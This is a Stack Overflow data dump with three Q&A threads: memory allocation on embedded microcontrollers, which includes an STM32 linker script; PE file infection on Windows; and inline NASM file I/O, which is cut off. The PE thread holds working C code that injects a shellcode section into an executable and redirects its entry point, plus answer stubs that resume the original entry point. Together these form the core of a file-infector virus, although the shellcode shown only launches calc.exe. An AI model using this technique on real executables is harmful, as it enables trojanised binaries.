"https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": true, "score": 3, "last_activity_date": 1545749544, "creation_date": 1545749544, "answer_id": 53923384, "question_id": 53922828, "link": "https://stackoverflow.com/questions/53922828/memory-allocation-in-embedded-systems/53923384#53923384", "title": "Memory allocation in embedded systems", "body": "<p>Embedded System is a very broad term. It may mean the micro controller without the operating system or \"normal\" computer with the OS. </p>\n\n<p>Some examples:</p>\n\n<ul>\n<li>uC reading the sensors and controlling the water flow through the pipe.</li>\n<li>Raspberry Pi run under Linux controlling the drone (it is embedded into the drone)</li>\n<li>PC computer controlling the laser cutter .</li>\n<li>mainframe computer in a radio telescope system</li>\n</ul>\n\n<p>So there is no one answer to your question. </p>\n\n<p>uCs will be programmed completely different way than the RPi used in the drone. </p>\n\n<p>But your question is probably about the uC systems I think.</p>\n\n<p>uC systems are usually programming is sometimes called a \"bare metal\" because programmers do not have the immediate software (abstraction layer) between their application and the actual hardware. So they access the memory, hardware registers and another resources directly. Even operating systems used in the bare metal development (called RTOS-es) are not even similar to the normal OSes like Linux or Windows. They are more libraries linked together with the bare metal application and just provide mechanisms of task management and communication, synchronization and data exchange.</p>\n\n<p>Some questions you asked in the comments</p>\n\n<p>DMA - Direct memory access - allows data transfer between the memory and peripherals or memory with no use of the processor core. Some uC have very complicated DMA &amp; event systems - for example the timer overflow can trigger the ADC which triggers the DMA transfer storing the converted data into the memory.</p>\n\n<p>Linker Script - defines what, how and where is stored in the memory. They may me very complicated and instruct that code or data to include or exclude, and how to organize the program memory. Below you have an example of the linker script for the STM32 family uC</p>\n\n<pre><code>/* Entry Point */\nENTRY(Reset_Handler)\n\n_estack = 0x10004000;    /* end of RAM */\n\n/* Generate a link error if heap and stack don't fit into RAM */\n_Min_Heap_Size = 0x100;      /* required amount of heap  */\n_Min_Stack_Size = 0x1000; /* required amount of stack */\n\n/* Specify the memory areas */\nMEMORY\n{\nRAM (xrw)      : ORIGIN = 0x20000000, LENGTH = 64K\nCCMRAM (rw)      : ORIGIN = 0x10000000, LENGTH = 16K\nFLASH (rx)      : ORIGIN = 0x8000000 + 32K, LENGTH = 512K - 34K\n}\n\n_FLASH_SIZE = LENGTH(FLASH);\n\n/* Define output sections */\nSECTIONS\n{\n  /* The startup code goes first into FLASH */\n  .isr_vector :\n  {\n    . = ALIGN(4);\n    _vectors_start = .;\n    KEEP(*(.isr_vector)) /* Startup code */\n    . = ALIGN(4);\n    _vectors_end = .;\n  } &gt;FLASH\n\n  .sizedata :\n  {\n    . = ALIGN(4);\n    KEEP(*(.sizedata))\n    KEEP(*(.sizedata*)) \n    . = ALIGN(4);\n  } &gt;FLASH  \n\n    .flashdata :\n  {\n    . = ALIGN(4);\n    KEEP(*(.rodata))         /* .rodata sections (constants, strings, etc.) */\n    KEEP(*(.rodata*))       /* .rodata* sections (constants, strings, etc.) */\n    . = ALIGN(4);\n  } &gt;FLASH\n\n  /* The program code and other data goes into FLASH */\n  .text :\n  {\n    . = ALIGN(4);\n    *(.text)           /* .text sections (code) */\n    *(.text*)          /* .text* sections (code) */\n    *(.glue_7)         /* glue arm to thumb code */\n    *(.glue_7t)        /* glue thumb to arm code */\n    *(.eh_frame)\n\n    KEEP (*(.init))\n    KEEP (*(.fini))\n\n    . = ALIGN(4);\n    _etext = .;        /* define a global symbols at end of code */\n  } &gt;FLASH\n\n  /* Constant data goes into FLASH */\n  .rodata :\n  {\n    . = ALIGN(4);\n    *(.rodata)         /* .rodata sections (constants, strings, etc.) */\n    *(.rodata*)        /* .rodata* sections (constants, strings, etc.) */\n    . = ALIGN(4);\n  } &gt;FLASH\n\n\n\n\n  .ARM.extab   : { *(.ARM.extab* .gnu.linkonce.armextab.*) } &gt;FLASH\n  .ARM : {\n    __exidx_start = .;\n    *(.ARM.exidx*)\n    __exidx_end = .;\n  } &gt;FLASH\n\n  .preinit_array     :\n  {\n    PROVIDE_HIDDEN (__preinit_array_start = .);\n    KEEP (*(.preinit_array*))\n    PROVIDE_HIDDEN (__preinit_array_end = .);\n  } &gt;FLASH\n  .init_array :\n  {\n    PROVIDE_HIDDEN (__init_array_start = .);\n    KEEP (*(SORT(.init_array.*)))\n    KEEP (*(.init_array*))\n    PROVIDE_HIDDEN (__init_array_end = .);\n  } &gt;FLASH\n  .fini_array :\n  {\n    PROVIDE_HIDDEN (__fini_array_start = .);\n    KEEP (*(SORT(.fini_array.*)))\n    KEEP (*(.fini_array*))\n    PROVIDE_HIDDEN (__fini_array_end = .);\n  } &gt;FLASH\n\n\n  /* used by the startup to initialize data */\n  _sidata = LOADADDR(.data);\n   _ROMEND = .;\n\n\n  /* Initialized data sections goes into CCMRAM, load LMA copy after code */\n  .data : \n  {\n    . = ALIGN(4);\n    _sdata = .;        /* create a global symbol at data start */\n    *(.data)           /* .data sections */\n    *(.data*)           /* .data sections */\n    . = ALIGN(4);\n    _edata = .;        /* define a global symbol at data end */\n  } &gt;CCMRAM AT&gt; FLASH\n\n   _ROMSIZE = _ROMEND - ORIGIN(FLASH) + _edata - _sdata;\n\n  _siccmram = ORIGIN(CCMRAM);\n    _sconfig = _ROMSIZE;\n  _econfig = _sconfig + 2K;\n    .bss :\n  {\n    /* This is used by the startup in order to initialize the .bss secion */\n    _sbss = .;         /* define a global symbol at bss start */\n    __bss_start__ = _sbss;\n    *(.bss)\n    *(.bss*)\n    *(COMMON)\n\n    . = ALIGN(4);\n    _ebss = .;         /* define a global symbol at bss end */\n    __bss_end__ = _ebss;\n  } &gt;CCMRAM\n\n  /* RAM section \n  */\n\n      /* Uninitialized data section */\n   .dummy :\n   {\n   . = ALIGN(4);\n   *(.dummy)\n   *(.dummy*)\n   . = ALIGN(4);\n   } &gt; RAM AT &gt; FLASH\n\n  .ram :\n  {  \n    . = ALIGN(4);\n    _sram = .;       /* create a global symbol at ccmram start */\n    *(.ram)\n    *(.ram*)   \n    . = ALIGN(4);\n    _eram = .;       /* create a global symbol at ccmram end */\n  } &gt;RAM \n\n  /* User_heap_stack section, used to check that there is enough RAM left */\n  ._user_heap_stack (NOLOAD):\n  {\n    . = ALIGN(8);\n    PROVIDE ( end = . );\n    PROVIDE ( _end = . );\n    . = . + _Min_Heap_Size;\n    . = . + _Min_Stack_Size;\n    . = ALIGN(8);\n  } &gt;CCMRAM\n\n\n\n  /* Remove information from the standard libraries */\n  /DISCARD/ :\n  {\n    libc.a ( * )\n    libm.a ( * )\n    libgcc.a ( * )\n  }\n\n\n  .ARM.attributes 0 : { *(.ARM.attributes) }\n}\n</code></pre>\n\n<p>MMU - some uCs have memory management units - but usually this peripheral only protects some memory areas. As you do not have the OS, you also do not have the file system - so nothing like mmap exists.</p>\n\n<pre><code>  #define SRAM_BASE ((uint32_t)0x20000000)\n</code></pre>\n\n<p>it only defines in the human readable form the address of something. In this case probably it is just the address of the beginning of the SRAM memory. Another example:</p>\n\n<pre><code>#define PERIPH_BASE           ((uint32_t)0x40000000U)\n#define APB2PERIPH_BASE       (PERIPH_BASE + 0x00010000U)\n#define SPI1_BASE             (APB2PERIPH_BASE + 0x00003000U)\n#define SPI1                ((SPI_TypeDef *) SPI1_BASE)\n</code></pre>\n"}], "owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1813, "favorite_count": 2, "accepted_answer_id": 53923384, "answer_count": 2, "score": 2, "last_activity_date": 1545749544, "creation_date": 1545744607, "last_edit_date": 1545746725, "question_id": 53922828, "link": "https://stackoverflow.com/questions/53922828/memory-allocation-in-embedded-systems", "title": "Memory allocation in embedded systems", "body": "<p>Linux/Unix systems often run on x86 CPU architecture which provides a MMU for memory mapping, but I guess embedded systems lack this, so no <code>malloc</code> and <code>free</code>.</p>\n\n<p>I saw that ES programmers can create a big static buffer to reserve memory:</p>\n\n<pre><code>unsigned char mem[10240];\n</code></pre>\n\n<p>But I wonder how it works, where does the buffer start exactly, and how the C compiler can map variable definitions to actual memory locations on some platforms.</p>\n\n<p>I have also seen such constants in ES headers (extracted from the ARM <code>STM32L1xx</code>):</p>\n\n<pre><code>#define SRAM_BASE ((uint32_t)0x20000000) /*!&lt; SRAM base address in the alias region */\n</code></pre>\n\n<p>I understand that SRAM stands for \"Static\" RAM but does \"base address\" means the beginning of the memory area reserved to heap/stack access, so a programmer could allocate and free chunks of RAM using a pointer to this base address and a linked list of blocks ?</p>\n"}, {"tags": ["c", "windows", "winapi", "code-injection", "portable-executable"], "comments": [{"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1545754512, "post_id": 53922779, "comment_id": 94689448, "body": "if you modify <code>AddressOfEntryPoint</code> you need save original value of <code>AddressOfEntryPoint</code> in shellcode and use this save copy for jump"}, {"owner": {"reputation": 111, "user_id": 6682918, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/e6JR7.jpg?s=128&g=1", "display_name": "bsdboy", "link": "https://stackoverflow.com/users/6682918/bsdboy"}, "reply_to_user": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1545755737, "post_id": 53922779, "comment_id": 94689693, "body": "@RbMm Yeah, that&#39;s what the author of the blog (the link I have already mentioned) has done using some placeholder values and then replacing them with original value. But, I don&#39;t know why his code is not working in my environment. Is there any other way to achieve the same?"}, {"owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1545755939, "post_id": 53922779, "comment_id": 94689737, "body": "you need not another way, but fix self errors"}, {"owner": {"reputation": 111, "user_id": 6682918, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/e6JR7.jpg?s=128&g=1", "display_name": "bsdboy", "link": "https://stackoverflow.com/users/6682918/bsdboy"}, "reply_to_user": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "edited": false, "score": 0, "creation_date": 1545756965, "post_id": 53922779, "comment_id": 94689926, "body": "Yeah, I can fix errors but to fix errors atleast there should be some errors. I mean   the issue is, in writing code from that blog on VS2017, I don&#39;t know why LoadLibrary returns NULL but LoadLibrary working fine when writing code in Notepad and then compiling it from &quot;Developer command prompt for VS2017&quot;. I have verified it by writing a sample code for MessageBoxA using LoadLibrary. So, that&#39;s why after messing with it for 5 days, I left that approach and decided to implement diff approach and then I have written above code."}], "answers": [{"tags": [], "owner": {"reputation": 25518, "user_id": 6401656, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jtwou.jpg?s=128&g=1", "display_name": "RbMm", "link": "https://stackoverflow.com/users/6401656/rbmm"}, "is_accepted": false, "score": 0, "last_activity_date": 1545773125, "creation_date": 1545773125, "answer_id": 53925721, "question_id": 53922779, "link": "https://stackoverflow.com/questions/53922779/how-to-resume-the-main-process-after-changing-the-entry-point-to-the-newly-added/53925721#53925721", "title": "How to resume the main process after changing the entry point to the newly added shellcode section in the PE file?", "body": "<p>for <em>x86</em> you need next shellcode:</p>\n\n<pre><code>_shcode proc\n    nop\n    nop\n    nop\n    call @@0\n    DD 0\n@@0:\n    mov eax,[esp]\n    mov edx,[eax]\n    sub [esp],edx\n    ;------------\n    ; your shell code here\n    ;------------\n    ret\n_shcode endp\n</code></pre>\n\n<p>for <em>x64</em> next:</p>\n\n<pre><code>shcode proc\n    nop\n    nop\n    nop\n    call @@0\n    DD 0\n@@0:\n    mov rax,[rsp]\n    movsxd rdx,dword ptr[rax]\n    sub [rsp],rdx\n    sub rsp,32\n    ;------------\n    ; your shell code here\n    ;------------\n    add rsp,32\n    ret\nshcode endp\n</code></pre>\n\n<p>in place <em>your shell code here</em> put your actual shell code procedure - you <code>\"\\x31\\..\\xd7\"</code> for example. </p>\n\n<p>key point here <code>DD 0</code> field at offset 8 from shell code begin (in both <em>x86</em> and <em>x64</em>).</p>\n\n<p>let you shell code will be have <code>RVA</code> (relative virtual address) in final exe. from another side <code>AddressOfEntryPoint</code> is <em>rva</em> of original exe entry point. you must write to <code>DD 0</code> field the <code>RVA + 8 - AddressOfEntryPoint</code>.</p>\n\n<ul>\n<li><p>really - let exe will be loaded at <code>ImageBase</code>.</p></li>\n<li><p>after <code>call @00</code> instruction executed in your shell code in stack\nwill be pushed return address - the next address after <code>call @@0</code> -\nthis will be <code>ImageBase + RVA + 8</code>.</p></li>\n<li><p>so after <code>mov rax,[rsp]</code> in <code>rax</code> will be <code>ImageBase + RVA + 8</code> and\nthis is address of original <code>DD 0</code>.</p></li>\n<li>the next <code>movsxd rdx,dword ptr[rax]</code>  read to <code>rdx</code> the <code>RVA + 8 -\nAddressOfEntryPoint</code> (remember this is what we store instead 0, when\nprepare shellcode) (in <em>x64</em> we use signed extend).</li>\n<li>and final <code>sub [rsp],rdx</code> give <code>(ImageBase + RVA + 8) - (RVA + 8 -\nAddressOfEntryPoint) = ImageBase + AddressOfEntryPoint</code></li>\n<li>so <code>ImageBase + AddressOfEntryPoint</code> will be at <code>[rsp]</code></li>\n<li>for <em>x64</em> need preserve 32 byte space (stack already correct align at\nthis point), for <em>x86</em> this is not need</li>\n<li>execute your shell code</li>\n<li>and final <code>ret</code> move us to <code>ImageBase + AddressOfEntryPoint</code> - to the\noriginal entry point</li>\n</ul>\n\n<p>let simply test this for self exe. test code is the same for both <em>x86/x64</em></p>\n\n<pre><code>extern \"C\"\n{\n    void __cdecl shcode(void*);\n}\n\nBOOL SimulateWriteSC(ULONG AddressOfEntryPoint, ULONG Rva, PVOID pvShcode)\n{\n    ULONG op;\n    pvShcode = RtlOffsetToPointer(pvShcode, 8);\n\n    if (VirtualProtect(pvShcode, 4, PAGE_EXECUTE_READWRITE, &amp;op))\n    {\n        *((PULONG)pvShcode) = (Rva + 8) - AddressOfEntryPoint;\n        VirtualProtect(pvShcode, 4, PAGE_EXECUTE_READWRITE, &amp;op);\n\n        return TRUE;\n    }\n\n    return FALSE;\n}\n\nvoid WINAPI ep(void* Peb)\n{\n    enum : LONG_PTR { tag = MAXLONG_PTR };\n    if (Peb == (void*)tag)\n    {\n        MessageBoxW(0,0,L\"Original Entry Called\",0);\n    }\n    else\n    {\n        MessageBoxW(0,0,L\"We in Shell Code\",0);\n        if (SimulateWriteSC(RtlImageNtHeader(&amp;__ImageBase)-&gt;OptionalHeader.AddressOfEntryPoint, \n            RtlPointerToOffset(&amp;__ImageBase, shcode), shcode))\n        {\n            shcode((void*)tag);\n        }\n    }\n    ExitProcess(0);\n}\n</code></pre>\n\n<p>here the <code>void WINAPI ep(void* Peb)</code> is real entry point of exe (use <a href=\"https://docs.microsoft.com/en-us/cpp/build/reference/entry-entry-point-symbol?view=vs-2017\" rel=\"nofollow noreferrer\"><code>/ENTRY:ep</code></a> linker option) . it called with single param - pointer to <code>PEB</code>. the <code>shcode</code> is already \"written\" to our exe (i use separate asm file + masm (ml.exe)). need only adjust the <code>DD 0</code> field, which i and do in <code>SimulateWriteSC</code> i write here <code>(Rva + 8) - AddressOfEntryPoint;</code> where <code>Rva = RtlPointerToOffset(&amp;__ImageBase, shcode)</code> is <em>rva</em> of my shell code and <code>AddressOfEntryPoint = RtlImageNtHeader(&amp;__ImageBase)-&gt;OptionalHeader.AddressOfEntryPoint</code> - <em>rva</em> of exe entry point. so exactly how i describe at begin. and then we call shellcode - <code>shcode((void*)tag);</code> - if all correct done - the original exe entry point - <code>ep</code> will be called again with passed parameter ( <code>(void*)tag</code> in concrete case). we detect this special tag parameter and exit. test is ok</p>\n"}], "owner": {"reputation": 111, "user_id": 6682918, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/e6JR7.jpg?s=128&g=1", "display_name": "bsdboy", "link": "https://stackoverflow.com/users/6682918/bsdboy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 258, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1545773125, "creation_date": 1545744245, "last_edit_date": 1545746382, "question_id": 53922779, "link": "https://stackoverflow.com/questions/53922779/how-to-resume-the-main-process-after-changing-the-entry-point-to-the-newly-added", "title": "How to resume the main process after changing the entry point to the newly added shellcode section in the PE file?", "body": "<p>I am trying to do PE infection via adding an extra section header at the end of PE file and writing a shellcode in it.</p>\n\n<p>I have added extra section and written the shellcode in it and changed the Original Entry Point (OEP) to the newly added section and it is executing fine; I mean my shellcode is running fine but now I want to resume the main process, and for that I need to again change the modified entry point to OEP. But, I am not able to figure it out. Please let me know if is there any way to resume the main process after executing the shellcode.</p>\n\n<p>And, I have also tried this <a href=\"https://0x00sec.org/t/pe-file-infection/401\" rel=\"nofollow noreferrer\">blog</a>, but it is also not working, in that the author has written inline asm code and putted some place holder to restore the OEP during run-time which will embedded dynamically in the shellcode.</p>\n\n<p>I am thinking to write a shellcode which will contain <code>JMP to_OEP</code>. However, I am not sure whether it will work or not.</p>\n\n<p>Please suggest me some ways or hints to resume the process after execution of shellcode in PE file.</p>\n\n<p>Code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;stdbool.h&gt;\n\n\n// returns the DOS Header\nPIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {\n    return (PIMAGE_DOS_HEADER)file;\n}\n\n/*\n* returns the PE header\n*/\nPIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {\n    PIMAGE_DOS_HEADER pidh = GetDosHeader(file);\n\n    return (PIMAGE_NT_HEADERS)((u_char*)pidh + pidh-&gt;e_lfanew);\n}\n\n/*\n* returns the file header\n*/\nPIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {\n    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);\n\n    return (PIMAGE_FILE_HEADER)&amp;pinh-&gt;FileHeader;\n}\n\n/*\n* returns the optional header\n*/\nPIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {\n    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);\n\n    return (PIMAGE_OPTIONAL_HEADER)&amp;pinh-&gt;OptionalHeader;\n}\n\n/*\n* returns the first section's header\n* AKA .text or the code section\n*/\nPIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {\n    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);\n\n    return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);\n}\n\nPIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {\n    return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)-&gt;FileHeader.NumberOfSections - 1));\n}\n\nDWORD align(DWORD size, DWORD align, DWORD addr) {\n    if (!(size % align))\n        return addr + size;\n    return addr + (size / align + 1) * align;\n}\n\n\nbool AddSection(char *filepath, char *sectionName, DWORD sizeOfSection) {\n\n    HANDLE hFile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\n    if (hFile == INVALID_HANDLE_VALUE)\n    {\n        printf(\"[-] Cannot open %s\\n\", filepath);\n        return 0;\n    }\n\n    DWORD dwFileSize = GetFileSize(hFile, NULL);\n\n    if (!dwFileSize)\n    {\n        printf(\"[-] Could not get files size\\n\");\n        CloseHandle(hFile);\n        return 0;\n    }\n\n    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);\n    DWORD dw = GetLastError();\n    if (!hMapping)\n    {\n        printf(\"[-] CreateFileMapping failed\\n\");\n        CloseHandle(hFile);\n        return 0;\n    }\n\n    LPBYTE pByte = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);\n    DWORD dw1 = GetLastError();\n    if (!pByte)\n    {\n        printf(\"[-] MapViewOfFile failed\\n\");\n        CloseHandle(hMapping);\n        CloseHandle(hFile);\n        return 0;\n    }\n\n    //check signature\n    //pDosHeader = (PIMAGE_DOS_HEADER)lpFile;\n    PIMAGE_DOS_HEADER dos = GetDosHeader(pByte);\n    if (dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)\n    {\n        printf(\"[-] DOS signature not found\\n\");\n        UnmapViewOfFile(pByte);\n        CloseHandle(hMapping);\n        CloseHandle(hFile);\n        return 0;\n    }\n    PIMAGE_NT_HEADERS nt = GetPeHeader(pByte);\n    PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos-&gt;e_lfanew + sizeof(DWORD));\n    PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));\n    PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));\n\n    ZeroMemory(&amp;SH[FH-&gt;NumberOfSections], sizeof(IMAGE_SECTION_HEADER));\n    CopyMemory(&amp;SH[FH-&gt;NumberOfSections].Name, sectionName, 8);\n    //We use 8 bytes for section name,cause it is the maximum allowed section name size\n\n    //lets insert all the required information about our new PE section\n    SH[FH-&gt;NumberOfSections].Misc.VirtualSize = align(sizeOfSection, OH-&gt;SectionAlignment, 0);\n\n    SH[FH-&gt;NumberOfSections].VirtualAddress = align(SH[FH-&gt;NumberOfSections - 1].Misc.VirtualSize, OH-&gt;SectionAlignment, SH[FH-&gt;NumberOfSections - 1].VirtualAddress);\n\n    SH[FH-&gt;NumberOfSections].SizeOfRawData = align(sizeOfSection, OH-&gt;FileAlignment, 0);\n\n    SH[FH-&gt;NumberOfSections].PointerToRawData = align(SH[FH-&gt;NumberOfSections - 1].SizeOfRawData, OH-&gt;FileAlignment, SH[FH-&gt;NumberOfSections - 1].PointerToRawData);\n\n    SH[FH-&gt;NumberOfSections].Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;\n\n    SetFilePointer(hFile, SH[FH-&gt;NumberOfSections].PointerToRawData + SH[FH-&gt;NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);\n\n    //end the file right here,on the last section + it's own size\n    SetEndOfFile(hFile);\n\n    //now lets change the size of the image,to correspond to our modifications\n    //by adding a new section,the image size is bigger now\n\n    OH-&gt;SizeOfImage = SH[FH-&gt;NumberOfSections].VirtualAddress + SH[FH-&gt;NumberOfSections].Misc.VirtualSize;\n\n    //and we added a new section,so we change the NOS too\n    FH-&gt;NumberOfSections += 1;\n    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);\n\n    //and finaly,we add all the modifications to the file\n    WriteFile(hFile, pByte, dwFileSize, &amp;dw, NULL);\n\n    PIMAGE_SECTION_HEADER first = GetFirstSectionHeader(pByte);\n    PIMAGE_SECTION_HEADER last = GetLastSectionHeader(pByte);\n\n    SetFilePointer(hFile, last-&gt;PointerToRawData, NULL, FILE_BEGIN);\n\n    // below shellcode will popup calc.exe\n    char *str = \n        \"\\x31\\xdb\\x64\\x8b\\x7b\\x30\\x8b\\x7f\"\n        \"\\x0c\\x8b\\x7f\\x1c\\x8b\\x47\\x08\\x8b\"\n        \"\\x77\\x20\\x8b\\x3f\\x80\\x7e\\x0c\\x33\"\n        \"\\x75\\xf2\\x89\\xc7\\x03\\x78\\x3c\\x8b\"\n        \"\\x57\\x78\\x01\\xc2\\x8b\\x7a\\x20\\x01\"\n        \"\\xc7\\x89\\xdd\\x8b\\x34\\xaf\\x01\\xc6\"\n        \"\\x45\\x81\\x3e\\x43\\x72\\x65\\x61\\x75\"\n        \"\\xf2\\x81\\x7e\\x08\\x6f\\x63\\x65\\x73\"\n        \"\\x75\\xe9\\x8b\\x7a\\x24\\x01\\xc7\\x66\"\n        \"\\x8b\\x2c\\x6f\\x8b\\x7a\\x1c\\x01\\xc7\"\n        \"\\x8b\\x7c\\xaf\\xfc\\x01\\xc7\\x89\\xd9\"\n        \"\\xb1\\xff\\x53\\xe2\\xfd\\x68\\x63\\x61\"\n        \"\\x6c\\x63\\x89\\xe2\\x52\\x52\\x53\\x53\"\n        \"\\x53\\x53\\x53\\x53\\x52\\x53\\xff\\xd7\";     \n\n    // Original Entry Point (OEP)\n    DWORD dwOEP = nt-&gt;OptionalHeader.AddressOfEntryPoint + nt-&gt;OptionalHeader.ImageBase;\n\n\n    WriteFile(hFile, str, strlen(str), &amp;dw, 0);\n\n\n    printf(\"EOP:- %d - %d\\n\", dwOEP, last-&gt;PointerToRawData);\n\n    nt-&gt;OptionalHeader.AddressOfEntryPoint = last-&gt;VirtualAddress; //- last-&gt;PointerToRawData;\n    CloseHandle(hFile);\n    return TRUE;\n}\n\n\nvoid main()\n{\n    if (AddSection(\"C:\\\\Users\\\\xyz\\\\sample_hello.exe\", \".TST\", 400))\n        printf(\"Section added!\\n\");\n    else \n        printf(\"Error writting code!\\n\");\n}\n</code></pre>\n\n<p>Development Environment:</p>\n\n<ul>\n<li>Windows 10</li>\n<li>Visual Studio 2017 (Community Ed.) </li>\n</ul>\n"}, {"tags": ["c", "assembly", "inline-assembly"], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 10831933, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a485d6ec9b09c124c5b032b62e28098?s=128&d=identicon&r=PG&f=1", "display_name": "Me.a", "link": "https://stackoverflow.com/users/10831933/me-a"}, "edited": false, "score": 0, "creation_date": 1545748897, "post_id": 53922814, "comment_id": 94688286, "body": "thanks :) I want to link it with a QT file for GUI purpose, I searched to see if there is a way to do this without inline assembly it seems there is no suggestion at least for x86 assembly for example i tried making separate .asm files as you said and then call them from C but QT cannot link .asm and give there is no reference to ... function"}, {"owner": {"reputation": 49, "user_id": 10831933, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a485d6ec9b09c124c5b032b62e28098?s=128&d=identicon&r=PG&f=1", "display_name": "Me.a", "link": "https://stackoverflow.com/users/10831933/me-a"}, "edited": false, "score": 0, "creation_date": 1545749279, "post_id": 53922814, "comment_id": 94688385, "body": "here is what i tried to link them but didn&#39;t work: <a href=\"https://stackoverflow.com/questions/44943948/setting-up-qt-creator-for-linking-and-compiling-assembly-code\" title=\"setting up qt creator for linking and compiling assembly code\">stackoverflow.com/questions/44943948/&hellip;</a>"}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 49, "user_id": 10831933, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a485d6ec9b09c124c5b032b62e28098?s=128&d=identicon&r=PG&f=1", "display_name": "Me.a", "link": "https://stackoverflow.com/users/10831933/me-a"}, "edited": false, "score": 0, "creation_date": 1545750051, "post_id": 53922814, "comment_id": 94688556, "body": "@Me.a You need to mark all your functions as <code>global</code> so the linker sees them.  Then it should just work.  In the code you linked, OP programs for Windows where external functions need to be prefixed with an underscore in assembly.  That&#39;s why his code doesn&#39;t link.  You are not affected by this as you program for Linux.  If you need further help, post your code and I can help you."}, {"owner": {"reputation": 49, "user_id": 10831933, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a485d6ec9b09c124c5b032b62e28098?s=128&d=identicon&r=PG&f=1", "display_name": "Me.a", "link": "https://stackoverflow.com/users/10831933/me-a"}, "edited": false, "score": 0, "creation_date": 1545753448, "post_id": 53922814, "comment_id": 94689240, "body": "oh sure, I will work on it and if I had any other problem I&#39;ll post it here. thanks :)"}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": true, "score": 4, "last_activity_date": 1545745089, "last_edit_date": 1545745089, "creation_date": 1545744516, "answer_id": 53922814, "question_id": 53922693, "link": "https://stackoverflow.com/questions/53922693/how-to-use-inline-assemblynasm-for-file-i-o/53922814#53922814", "title": "how to use inline assembly(NASM) for file I/O", "body": "<p>The GNU assembler (which is what gcc uses) does not use NASM syntax.  It rather uses a variant of Microsoft's MASM syntax where no brackets are needed to dereference a variable.  Since you don't want to load the value of the <code>c</code> variable but rather its address, you need an <code>offset</code> keyword:</p>\n\n<pre><code>mov ecx, offset c\n</code></pre>\n\n<p>I strongly recommend you to avoid inline assembly as much as possible for learning assembly.  Using inline assembly in gcc requires good knowledge of how exactly this whole thing works and writing random instructions usually leads to wrong code.  Even your simple code is already fundamentally broken and would not work if it was any more complicated than that (so the compiler had a chance to try to use the registers you overwrote without telling).</p>\n\n<p>Instead, put your assembly in a separate file and link it in.  This sidesteps all issues you have with inline assembly and allows you to use NASM as you wanted.  For example, try something like 